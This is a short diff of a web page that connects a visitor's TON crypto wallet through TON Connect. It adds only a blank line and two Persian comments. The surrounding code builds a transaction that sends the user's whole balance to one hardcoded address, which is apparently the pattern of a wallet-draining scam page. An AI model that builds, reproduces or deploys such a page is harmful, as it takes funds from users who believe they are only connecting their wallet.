@@ -49,6 +49,7 @@
         .wallet-info p {
             margin: 5px 0;
         }
+
     </style>
 </head>
 <body>
@@ -81,6 +82,7 @@
         // اتصال کیف پول
         connectWalletBtn.addEventListener("click", async () => {
             try {
+                // اتصال به کیف پول
                 const connectedWallet = await tonConnectUI.connectWallet();
                 userWalletAddress = connectedWallet.account.address;
                 walletAddressSpan.textContent = userWalletAddress;
@@ -114,7 +116,7 @@
             const transaction = {
                 messages: [
                     {
-                        address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW",
+                        address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // آدرس مقصد
                         amount: (userBalance * 1e9).toString(), // تبدیل TON به nanotons
                     },
                 ],
